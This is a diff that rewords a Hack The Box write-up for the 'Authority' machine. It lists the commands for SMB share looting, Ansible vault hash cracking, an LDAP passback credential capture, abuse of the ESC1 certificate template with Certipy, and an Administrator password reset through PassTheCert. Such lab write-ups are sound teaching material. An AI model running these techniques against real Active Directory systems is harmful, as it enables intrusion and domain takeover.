@@ -8,7 +8,7 @@ https://app.hackthebox.com/machines/Authority
 
 ### Port scanning:
 
-I began the enumeration with port & service scan using rustscan & found multiple open port running in the machine:
+I began the enumeration by conducting a port and service scan using Rustscan. The scan revealed multiple open ports running on the machine:
 
 ```bash
 sudo rustscan -a 10.10.11.222 -- -sC -sV -vv -oN authority_nmap
@@ -342,18 +342,18 @@ Host script results:
 |_  start_date: N/A
 ```
 
-In the scan results I observed 2 domains runnig on the machine:
+From the scan results, I observed the presence of two domains on the machine:
 
 ```
 - htb.corp
 - authority.htb.corp
 ```
 
-I added both of them to my host config file.
+I added both of these domains to my host configuration file for further investigation.
 
 ### DNS enumeration:
 
-As the port 53 is open & DNS server is running, I performed some DNS enumeartion activity.
+As port 53 was open and a DNS server was running, I conducted DNS enumeration to gather more information.
 
 Checked for the DNS details:
 
@@ -362,7 +362,8 @@ dig htb.corp any @10.10.11.222
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ffba9a9a-1624-4b30-a0a1-bf642f304029)
 
-Checked for the nameserver & it again revealed the "authority.htb.corp"
+Verified the nameserver, which revealed "authority.htb.corp" as the authoritative server for the domain:
+
 ```bash
 dig htb.corp any @10.10.11.222 -t NS
 ```
@@ -373,36 +374,35 @@ dig axfr htb.corp any @10.10.11.222
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c129e868-3a24-4a36-9980-c45795421f2d)
 
-So, DNS enumeration didn't revealed anything much intresting.
+In the end, DNS enumeration didn't reveal any significant findings.
 
-### Web enumeration:
+### Web Enumeration:
 
-When I didn't found much in the DNS, I moved onto checking web since port 80 & 443 is open.
-I started the sub-domain & directory enumeration on both the domains but except Microsoft IIS web server I didn't found anything.
+Since the DNS enumeration didn't yield substantial results, I proceeded to check the web services on the open ports 80 and 443.
 
-I then moved onto checking port 8443 & found that there is an application "PWM" running on the server.
-As per the google search: "PWM is an open source password self-service application for LDAP directories." It's running on version "v2.0.3 bc96802e"
+I performed sub-domain and directory enumeration on both the domains, but the results were unremarkable. The web server on these ports appeared to be Microsoft IIS.
+
+I then moved on to explore port 8443 and discovered an application called "PWM," running on version "v2.0.3 bc96802e." A Google search revealed that "PWM is an open source password self-service application for LDAP directories."
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5721689b-1632-409b-ad65-909447334abd)
 
 ### SMB enumeration
 
-As the port 445 is open & running I checked for the shares where I have access as a guest user.
-I observed that there is one share "Development" in which I have read access as a guest user.
+Since port 445 is open and running, I proceeded to enumerate the SMB shares on the target machine. I discovered one share named "Development," where I have read access as a guest user.
 
 ```bash
 smbmap -H "htb.corp" -s Development -u 'DoesNotExist'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/bd418dfb-e193-44c9-b8bd-2c1d2035dd33)
 
-This developement share has some automation & PWM configuration file present in it.
+Within the "Development" share, I found files related to automation and the PWM configuration.
 
 ```bash
 smbmap -H "htb.corp" -R "Development" -u 'DoesNotExist'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/051ce1f1-73fd-4eeb-9236-4eced8c1c46b)
 
-I connected to this share & downloaded everything from it into my attacker machine.
+I connected to this share and downloaded all the files to my attacker machine.
 
 ```bash
 smbclient \\\\htb.corp\\Development -U 'Guest'
@@ -413,15 +413,15 @@ smb: \> mget *
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/62465e43-1b8d-4a34-8982-0cf9625a46dd)
 
-In one of the file 'ansible.cfg' I observed a remote user "svc_pwm".
+In the "ansible.cfg" file, I observed a remote user named "svc_pwm."
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a690bc9a-c303-4336-b3bb-1abd19b92491)
 
-In another file "ansible_inventory" I got some credentials for winrm associated with the user "Administrator"
+In another file named "ansible_inventory," I found some credentials for WinRM associated with the user "Administrator."
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d9ca85e7-7ec1-4e8c-a4ca-cd597852123f)
 
-I tried to login with these credentials but none of them worked, then I moved further & looked into another directory where I found some ANSIBLE hashes in this directory:
+Upon trying the discovered credentials, I didn't find a successful login. However, I continued my investigation and found ANSIBLE hashes in the following directory:
 
 ```
 Automation/Ansible/PWM/defaults
@@ -432,9 +432,7 @@ Automation/Ansible/PWM/defaults
 
 ## Initial access:
 
-So, now I have the ANSIBLE hashes & we can crack these hashes using John the ripper & after cracking we can get use "ansible decrpyt" function to get the secret from the Ansible vault.
-
-To convert the hashes into John the ripper format we can use:
+Now that we have the ANSIBLE hashes, we can proceed to crack them using John the Ripper. To convert the hashes into John the Ripper format, we can use the ansible2john.py script for each of the three hashes.
 
 ```bash
 ansible2john.py ansible.yml > ansi #we can do the same for other 2 hashes as well.
@@ -442,25 +440,25 @@ ansible2john.py ansible.yml > ansi #we can do the same for other 2 hashes as wel
 
 I created 3 files for 3 different hashes to convert & crack using John.
 
-After converting the format we can crack it using below command:
+After converting the format, we can crack the hashes using the following command with John the Ripper:
 
 ```bash
 john ansi -w=/usr/share/wordlists/rockyou.txt
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0ef666a1-c546-44d0-bd1f-5352b08e78ab)
 
-once cracking the file & extracting the password from it we can use it to extract the secret from ANSIBLE files, as referred from this [blog](https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/):
+Once the cracking is complete, we can extract the password from the cracked hash. This password can be used to decrypt the secrets in the ANSIBLE files. we can use the following command to decrypt the ANSIBLE files using the extracted password as referred from this [blog](https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/):
 
 ```bash
 cat ansible1.yml | ansible-vault decrypt
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f56ad7b8-093f-4f28-a7df-45d83eff6d30)
 
-While logging in, I got some error when I entered wrong credentials where there is another host relvealed running inside the Authority box, which I added to my hosts file.
+During the login process, I encounter an error when entering wrong credentials, revealing another host running inside the Authority box. I added this host to my hosts file for further investigation.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc35f556-f9a7-4f41-8a7d-c883caf57080)
 
-Moving further I then moved on configuration manager page, where I successfully logged in from one of the extracted credentials from Ansible vault. 🙂
+Proceeding further, I accessed the configuration manager page successfully using one of the extracted credentials from the Ansible vault. 🙂
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c54e38a2-6134-49b7-8810-f635a06d0667)
 
@@ -468,63 +466,59 @@ Moving further I then moved on configuration manager page, where I successfully 
 
 ## User access:
 
-When I logged into the configuration manager I was looking around the functionalities & found some intresting options in the LDAP directory connection settings. I observed that there are some saved credentials in the LDAP proxy vault.
+After successfully logging into the configuration manager, I explored its functionalities and came across some interesting options in the LDAP directory connection settings. Notably, I noticed that there are saved credentials in the LDAP proxy vault.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/37f5490c-1d4b-430c-bc3b-6e9d482edba8)
 
-Also, there is an option of testing LDAP url. This scenario reminded me of [LDAP passback attack](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210), which I learned almost an year ago.
+Furthermore, there is an option to test the LDAP URL. This scenario reminded me of a technique I learned about nearly a year ago, known as the [LDAP passback attack](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210).
 
-So, I turned on the rouge LDAP server on my host which I already setup last year using OpenLDAP & also started tcpdump to listen all incoming connections on port 389:
+To proceed with the attack, I set up a rogue LDAP server on my host, utilizing OpenLDAP. Additionally, I started **tcpdump** to listen for all incoming connections on port 389:
 
 ```bash
 sudo tcpdump -SX -i tun0 tcp port 389
 ```
-And added my IP into the test LDAP url section & clicked on "Test ldap profile". Quickly after clicking I started receiving the packets & in on of the packet I observed a user "svc_ldap" & clear text credentials with it:
+Next, I added my IP to the test LDAP URL section within the configuration manager and clicked on "Test LDAP profile." Shortly after clicking, I started receiving packets, and within one of them, I discovered a user named "svc_ldap" along with its plaintext credentials:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/afb75451-1e2d-4c1e-b379-c655ed9aca65)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dcb93f11-f029-409f-b7fa-99fbea49b478)
 
-Using these credentials I tried to login via win-rm protocol & I logged in successfully. Also, after logging in with "svc_ldap" I got user flag as well. (pwn3d!🙂)
+Using these credentials, I attempted to log in via the WinRM protocol, and I successfully gained access. Additionally, after logging in with the "**svc_ldap**" account, I retrieved the user flag. (pwn3d!🙂)
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## Privilege Escalation:
 
-Starting for the privilege escalation when I enumerated through the directories I observed a directory in "C:\" called :"certs"
+For the privilege escalation phase, I began by enumerating the directories and discovered a directory named "certs" in "C:". Given the name of the box is "Authority," this directory hinted towards certificate authority templates, which could be potentially exploited to escalate privileges or impersonate users.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9fa0fe59-431b-44a5-b65d-2f497d7b90c5)
 
-This directory & the box name "Authority" hinted towards the certifcate authority templates, where I can use vulnerbale certificate templates to escalate my privilege or to impersonate any user.
-
-I used a binary "[certify.exe](https://github.com/GhostPack/Certify)" to check for all the available vulnerable certificates.
-Searching for the vulnerable certifiactes using "Certify" showed 1 available certificate "Corpvpn", which we can request.
+I utilized the binary "[Certify.exe](https://github.com/GhostPack/Certify)" to check for all available vulnerable certificates. The search revealed one certificate named "Corpvpn," which seemed exploitable.
 
 ```PS
 .\Certify.exe find /vulnerable
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d27cfafb-6331-49b0-8048-fe78f0de4baf)
 
-From the [hactrickz](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1) website I got to know that, the "ENROLLEE_SUPPLIES_SUBJECT" flag allows the certificate requester to define the subject details, which are typically used for identification purposes, such as the common name, organization, and other attributes.
+From the [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1) website, I learned that the "ENROLLEE_SUPPLIES_SUBJECT" flag allows the certificate requester to define the subject details, typically used for identification purposes, such as the common name, organization, and other attributes.
 
-This indicates we can add a new computer account in Active Directory using the credentials of a domain user. In this case, I will use the "[impacket-addcomputer](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)" tool.
+This indicated that we could potentially add a new computer account in Active Directory using the credentials of a domain user. To accomplish this, I used the "[Impacket-addcomputer](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)" tool.
 
 ```bash
 impacket-addcomputer 'authority.htb/svc_ldap:<password_here>' -method LDAPS -computer-name 'FXI' -computer-pass 'Password1@'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dd5dde22-1951-48dd-81a6-cf4c30cd07e5)
 
-After creating the new machine account we can verify if it's active in AD or not using CrackMapExec.
+After creating the new machine account, I verified its active status in AD using CrackMapExec.
 
 ```bash
 crackmapexec smb 10.10.11.222 -u "FXI$" -p 'Password1@' -d auhtority.htb
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/70d6afd7-69ed-4a8b-a389-656f5d3a25bb)
 
-Now using Certipy, I will generate a certificate using the computer account "FXI$" with the password "Passw0rd1!" and the template "CorpVPN," which will allow us to escalate privileges.
+Now using Certipy, I generated a certificate using the computer account "**FXI$**" with the password "**Passw0rd1!**" and the template "**CorpVPN**," enabling privilege escalation.
 
-Although, the machine account is created & active in the AD, when I was using certipy to generate the certificate from the vulnerable template & I was constantly getting 2 errors:
-
+However, during the certificate generation, I encountered two errors:
 ```
 - Unknown DCE RPC fault status code: 00000721
 - The NETBIOS connection with the remote host timed out.
@@ -544,14 +538,14 @@ After adding the IP, I restarted the network manager.
 sudo systemctl restart NetworkManager
 ```
 
-After doing all these changes, I tried again to generate the certificate & this time I got the certificate.
+Upon retrying the certificate generation, I was successful in obtaining the certificate.
 
 ```bash
 certipy req -u 'FXI$' -p 'Password1@' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -template 'CorpVPN' -upn 'administrator@authority.htb'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/664177ed-09ca-48cf-9030-e425e1e3bf8d)
 
-After the generation of the administrator certificate I generated 2 other certificates: one without including the private key and another without including the certificate.
+Subsequently, I generated two additional certificates: one without including the private key and another without including the certificate.
 
 ```bash
 certipy cert -pfx administrator.pfx -nokey -out user.crt
@@ -560,14 +554,14 @@ certipy cert -pfx administrator.pfx -nocert -out user.key
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c392f25e-d3e5-49bc-ad6a-2058ebe45edd)
 
-After generating the certificates I used the tool "[**PassTheCert**](https://github.com/AlmondOffSec/PassTheCert)" which I found in this [blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), which will reset the administrator password using our certificates.
+Using the tool "[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)" found in this [blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), I reset the administrator password using our certificates.
 
 ```bash
 python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/53118f62-b00a-4ec1-b9af-76bb9d8f0bdb)
 
-After the password is reset I verified it using the CrackMapExec & observed that I have the access of Administrator user.
+After the password reset, I verified the new credentials using CrackMapExec, confirming that I had access to the Administrator account.
 
 ```bash
 crackmapexec smb 10.10.11.222 -u "Administrator" -p 'OHmxaa5pHwIufhIWtGIBitBKllG5hnmb' -d auhtority.htb
